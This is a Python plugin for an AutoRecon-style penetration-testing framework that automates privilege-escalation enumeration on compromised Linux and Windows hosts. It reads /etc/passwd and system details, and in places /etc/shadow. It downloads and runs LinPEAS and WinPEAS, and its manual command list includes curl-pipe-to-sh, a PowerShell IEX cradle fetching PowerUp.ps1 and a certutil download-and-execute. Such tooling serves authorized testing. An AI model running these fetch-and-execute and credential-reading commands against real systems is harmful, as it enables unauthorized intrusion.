from autorecon.plugins import PostExploit
import os
import json

class PrivilegeEscalation(PostExploit):
    """Post-exploitation plugin for automated privilege escalation enumeration and exploitation."""

    def __init__(self):
        super().__init__()
        self.name = "Privilege Escalation"
        self.tags = ['postexploit', 'privesc', 'enumeration']
        self.activity_type = 'privesc'
        self.risk_level = 'high'
        self.requires_confirmation = True
        self.requires_shell = True

    def configure(self):
        self.add_choice_option('target-os', choices=['windows', 'linux', 'auto'], default='auto', help='Target operating system. Default: %(default)s')
        self.add_option('shell-type', default='bash', help='Type of shell available (bash, cmd, powershell, etc.). Default: %(default)s')
        self.add_option('session-info', help='Information about the current session (user, privileges, etc.)')
        self.add_true_option('download-tools', help='Download and execute privilege escalation tools')
        self.add_true_option('kernel-exploits', help='Check for kernel exploitation opportunities')
        self.add_true_option('service-exploits', help='Check for service exploitation opportunities')
        self.add_true_option('sudo-exploits', help='Check for sudo/SUID exploitation opportunities')
        self.add_true_option('cron-exploits', help='Check for cron job exploitation opportunities')
        self.add_option('lhost', help='Local host IP for reverse shells')
        self.add_option('lport', default='4445', help='Local port for reverse shells. Default: %(default)s')

    def check(self):
        # Basic validation
        if not self.get_option('lhost'):
            self.warn('No LHOST specified. Some exploits may not work.')
        return True

    async def run(self, target, session_info=None):
        """Execute privilege escalation enumeration and exploitation."""
        
        target_os = self.get_option('target_os')
        
        self.info(f'Starting privilege escalation on {target.address}')
        
        # Create results directory
        privesc_dir = os.path.join(target.scandir, 'privilege_escalation')
        os.makedirs(privesc_dir, exist_ok=True)

        results = {
            'target': target.address,
            'os': target_os,
            'enumeration': {},
            'vulnerabilities': [],
            'exploits_attempted': []
        }

        if target_os == 'linux' or target_os == 'auto':
            await self._linux_privesc(target, privesc_dir, results)
        
        if target_os == 'windows' or target_os == 'auto':
            await self._windows_privesc(target, privesc_dir, results)

        # Save results
        results_file = os.path.join(privesc_dir, 'privesc_results.json')
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)

        self.info(f'Privilege escalation completed. Found {len(results["vulnerabilities"])} potential vulnerabilities.')

    async def _linux_privesc(self, target, output_dir, results):
        """Linux privilege escalation enumeration and exploitation."""
        
        self.info('Performing Linux privilege escalation enumeration')

        # System enumeration
        enum_commands = {
            'system_info': 'uname -a; cat /etc/*release*; cat /proc/version',
            'user_info': 'id; whoami; groups; cat /etc/passwd | grep -v nologin',
            'sudo_rights': 'sudo -l 2>/dev/null',
            'suid_files': 'find / -perm -4000 -type f 2>/dev/null',
            'sgid_files': 'find / -perm -2000 -type f 2>/dev/null',
            'world_writable': 'find / -writable -type d 2>/dev/null | grep -v proc',
            'cron_jobs': 'cat /etc/crontab; ls -la /etc/cron*; crontab -l 2>/dev/null',
            'running_processes': 'ps aux | grep root',
            'network_connections': 'netstat -antup 2>/dev/null || ss -antup',
            'installed_packages': 'dpkg -l 2>/dev/null || rpm -qa 2>/dev/null'
        }

        for check_name, command in enum_commands.items():
            output_file = os.path.join(output_dir, f'linux_{check_name}.txt')
            await target.execute(f'bash -c "{command}" > {output_file} 2>&1')

        # Download and run LinPEAS if enabled
        if self.get_option('download_tools'):
            await self._download_linpeas(target, output_dir)

        # Check for specific exploits
        if self.get_option('kernel_exploits'):
            await self._check_linux_kernel_exploits(target, output_dir, results)

        if self.get_option('sudo_exploits'):
            await self._check_sudo_exploits(target, output_dir, results)

        if self.get_option('service_exploits'):
            await self._check_service_exploits(target, output_dir, results)

    async def _windows_privesc(self, target, output_dir, results):
        """Windows privilege escalation enumeration and exploitation."""
        
        self.info('Performing Windows privilege escalation enumeration')

        # System enumeration
        enum_commands = {
            'system_info': 'systeminfo',
            'user_info': 'whoami /all',
            'local_users': 'net user',
            'local_groups': 'net localgroup',
            'running_processes': 'tasklist /v',
            'services': 'sc query',
            'scheduled_tasks': 'schtasks /query /fo LIST /v',
            'network_connections': 'netstat -an',
            'installed_programs': 'wmic product get name,version',
            'startup_programs': 'wmic startup get caption,command',
            'environment_variables': 'set'
        }

        for check_name, command in enum_commands.items():
            output_file = os.path.join(output_dir, f'windows_{check_name}.txt')
            await target.execute(f'cmd /c "{command}" > {output_file} 2>&1')

        # Download and run WinPEAS if enabled
        if self.get_option('download_tools'):
            await self._download_winpeas(target, output_dir)

        # Check for specific Windows exploits
        if self.get_option('kernel_exploits'):
            await self._check_windows_kernel_exploits(target, output_dir, results)

        if self.get_option('service_exploits'):
            await self._check_windows_service_exploits(target, output_dir, results)

    async def _download_linpeas(self, target, output_dir):
        """Download and execute LinPEAS."""
        self.info('Downloading and executing LinPEAS')
        
        linpeas_url = 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh'
        linpeas_path = os.path.join(output_dir, 'linpeas.sh')
        
        # Download LinPEAS
        await target.execute(f'curl -L {linpeas_url} -o {linpeas_path}')
        await target.execute(f'chmod +x {linpeas_path}')
        
        # Execute LinPEAS
        linpeas_output = os.path.join(output_dir, 'linpeas_output.txt')
        await target.execute(f'{linpeas_path} > {linpeas_output} 2>&1')

    async def _download_winpeas(self, target, output_dir):
        """Download and execute WinPEAS."""
        self.info('Downloading and executing WinPEAS')
        
        winpeas_url = 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe'
        winpeas_path = os.path.join(output_dir, 'winpeas.exe')
        
        # Download WinPEAS
        await target.execute(f'powershell -c "Invoke-WebRequest -Uri {winpeas_url} -OutFile {winpeas_path}"')
        
        # Execute WinPEAS
        winpeas_output = os.path.join(output_dir, 'winpeas_output.txt')
        await target.execute(f'{winpeas_path} > {winpeas_output} 2>&1')

    async def _check_linux_kernel_exploits(self, target, output_dir, results):
        """Check for Linux kernel exploits."""
        self.info('Checking for Linux kernel exploits')
        
        # Get kernel version
        kernel_output = os.path.join(output_dir, 'kernel_version.txt')
        await target.execute(f'uname -r > {kernel_output}')
        
        # Common kernel exploits to check
        kernel_exploits = [
            {
                'name': 'DirtyCow',
                'cve': 'CVE-2016-5195',
                'check_cmd': 'uname -r | grep -E "^(3\.|4\.0|4\.1|4\.2|4\.3|4\.4\.0-[0-4][0-9]|4\.4\.0-5[0-3])"'
            },
            {
                'name': 'Dirty Pipe',
                'cve': 'CVE-2022-0847',
                'check_cmd': 'uname -r | grep -E "^5\.(1[6-9]|[2-9][0-9])\."'
            }
        ]

        for exploit in kernel_exploits:
            check_result = await target.execute(f'bash -c "{exploit["check_cmd"]}" > /dev/null 2>&1 && echo "VULNERABLE" || echo "NOT_VULNERABLE"')
            # Note: In a real implementation, you'd parse the output

    async def _check_sudo_exploits(self, target, output_dir, results):
        """Check for sudo-related exploits."""
        self.info('Checking for sudo exploits')
        
        # Check sudo version
        sudo_version_output = os.path.join(output_dir, 'sudo_version.txt')
        await target.execute(f'sudo --version > {sudo_version_output} 2>&1')
        
        # Check for CVE-2021-3156 (Baron Samedit)
        await target.execute(f'sudoedit -s / | head -1 > {output_dir}/sudo_cve_2021_3156_check.txt 2>&1')

    async def _check_service_exploits(self, target, output_dir, results):
        """Check for service-related exploits."""
        self.info('Checking for service exploits')
        
        # Check for writable service binaries
        await target.execute(f'find /usr/bin /usr/sbin /bin /sbin -writable -type f > {output_dir}/writable_binaries.txt 2>/dev/null')

    async def _check_windows_kernel_exploits(self, target, output_dir, results):
        """Check for Windows kernel exploits."""
        self.info('Checking for Windows kernel exploits')
        
        # Get system info for exploit checking
        await target.execute(f'systeminfo > {output_dir}/systeminfo_detailed.txt')

    async def _check_windows_service_exploits(self, target, output_dir, results):
        """Check for Windows service exploits."""
        self.info('Checking for Windows service exploits')
        
        # Check for unquoted service paths
        await target.execute(f'wmic service get name,displayname,pathname,startmode > {output_dir}/services_detailed.txt')

    def manual(self, target, plugin_was_run):
        if not plugin_was_run:
            target.add_manual_command('Manual privilege escalation enumeration:', [
                '# Linux privilege escalation',
                '# System enumeration',
                'uname -a; cat /etc/*release*; cat /proc/version',
                'id; whoami; groups',
                'sudo -l',
                'cat /etc/passwd | grep -v nologin',
                'cat /etc/shadow 2>/dev/null',
                '',
                '# Find SUID/SGID files',
                'find / -perm -4000 -type f 2>/dev/null',
                'find / -perm -2000 -type f 2>/dev/null',
                '',
                '# Check for writable directories',
                'find / -writable -type d 2>/dev/null | grep -v proc',
                '',
                '# Cron jobs',
                'cat /etc/crontab',
                'ls -la /etc/cron*',
                'crontab -l',
                '',
                '# Running processes',
                'ps aux | grep root',
                '',
                '# Network connections',
                'netstat -antup',
                'ss -antup',
                '',
                '# Automated tools',
                'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
                'python3 -c "import urllib.request; urllib.request.urlretrieve(\'https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py\', \'linuxprivchecker.py\')" && python3 linuxprivchecker.py',
                '',
                '# Windows privilege escalation',
                '# System enumeration',
                'systeminfo',
                'whoami /all',
                'net user',
                'net localgroup',
                '',
                '# Running processes and services',
                'tasklist /v',
                'sc query',
                'schtasks /query /fo LIST /v',
                '',
                '# Network connections',
                'netstat -an',
                '',
                '# Installed programs',
                'wmic product get name,version',
                'wmic startup get caption,command',
                '',
                '# Automated tools',
                'powershell -c "IEX(New-Object Net.WebClient).downloadString(\'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1\')"',
                'certutil -urlcache -split -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe winpeas.exe && winpeas.exe',
                '',
                '# Kernel exploits',
                '# Check for CVE-2021-3156 (Baron Samedit)',
                'sudoedit -s /',
                '# Check for CVE-2016-5195 (DirtyCow)',
                '# Check for CVE-2022-0847 (Dirty Pipe)',
                '',
                '# Service exploits',
                '# Unquoted service paths (Windows)',
                'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """"'
            ])